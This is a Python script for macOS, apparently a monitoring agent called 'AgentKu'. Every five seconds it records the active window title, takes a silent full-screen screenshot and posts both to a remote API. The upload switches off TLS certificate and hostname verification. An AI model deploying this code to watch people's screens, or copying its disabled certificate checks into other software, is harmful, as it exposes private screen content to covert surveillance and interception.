import time
import json
import subprocess
import urllib.request

def get_active_window():
    script = """
    tell application "System Events"
        set frontApp to first application process whose frontmost is true
        set appName to name of frontApp
        try
            set winTitle to name of front window of frontApp
            return appName & " - " & winTitle
        on error
            return appName
        end try
    end tell
    """
    try:
        res = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
        return res.stdout.strip()
    except Exception:
        return "Unknown"

def main():
    print("AgentKu macOS (Real Data -> Laravel API) started...")
    url = "https://agentku.mybbs.id/api/monitor"
    while True:
        window = get_active_window()
        
        # Take screenshot
        import os, base64
        screen_b64 = ""
        try:
            # Capture full screen
            os.system('screencapture -x -C /tmp/agent_screen.jpg')
            # Compress and resize using native macOS tool (sips) to avoid 413 Payload Too Large
            os.system('sips -Z 1280 -s format jpeg -s formatOptions 60 /tmp/agent_screen.jpg > /dev/null 2>&1')
            
            with open('/tmp/agent_screen.jpg', 'rb') as f:
                screen_b64 = "data:image/jpeg;base64," + base64.b64encode(f.read()).decode('utf-8')
        except Exception as e:
            print("Failed to capture screen:", e)
            
        import socket
        data = {
            "status": "active", 
            "window": window, 
            "user": socket.gethostname(), 
            "device": "Mac",
            "screen": screen_b64
        }
        
        req = urllib.request.Request(
            url, 
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            method='POST'
        )
        
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx) as response:
                print(f"Sent: {window} -> {response.status}")
        except Exception as e:
            print(f"Error send payload: {e}")
            
        time.sleep(5)

if __name__ == "__main__":
    main()
